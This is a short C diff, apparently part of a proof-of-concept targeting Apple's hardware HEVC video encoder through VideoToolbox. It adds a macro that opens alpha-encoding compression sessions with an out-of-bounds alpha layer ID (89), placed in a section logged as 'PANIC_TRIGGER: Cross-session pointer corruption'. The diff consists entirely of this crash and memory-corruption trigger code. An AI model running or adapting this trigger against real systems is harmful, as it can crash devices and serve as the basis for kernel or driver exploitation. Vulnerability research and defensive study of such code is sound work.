@@ -10798,6 +10798,31 @@ vps_cd_done:
         if (oob_aid < 2) oob_aid = 89;
 
         int vw = 192, vh = 192;
+
+        #ifndef CREATE_ALPHA_SESSION
+        #define CREATE_ALPHA_SESSION(w_, h_, aid_val, out_s) do { \
+            VTCompressionSessionRef s_ = NULL; \
+            CFMutableDictionaryRef es_ = CFDictionaryCreateMutable(NULL, 0, \
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks); \
+            CFDictionarySetValue(es_, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue); \
+            CFDictionarySetValue(es_, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue); \
+            OSStatus cs_ = VTCompressionSessionCreate(NULL, w_, h_, \
+                kCMVideoCodecType_HEVC, es_, NULL, NULL, encode_cb, NULL, &s_); \
+            CFRelease(es_); \
+            if (cs_ == noErr && s_) { \
+                VTSessionSetProperty(s_, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue); \
+                VTSessionSetProperty(s_, CFSTR("EncodesAlpha"), kCFBooleanTrue); \
+                int av_ = (aid_val); \
+                CFNumberRef an_ = CFNumberCreate(NULL, kCFNumberIntType, &av_); \
+                VTSessionSetProperty(s_, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), an_); \
+                CFRelease(an_); \
+                cs_ = VTCompressionSessionPrepareToEncodeFrames(s_); \
+                if (cs_ != noErr) { VTCompressionSessionInvalidate(s_); CFRelease(s_); s_ = NULL; } \
+            } else { s_ = NULL; } \
+            (out_s) = s_; \
+        } while(0)
+        #endif
+
         rlog("=== PANIC_TRIGGER: Cross-session pointer corruption ===\n");
         rlog("Cycles=%d, sessions/cycle=%d, AID=%d (0x%02X), res=%dx%d\n\n",
              cycles, sess_per_cycle, oob_aid, oob_aid, vw, vh);
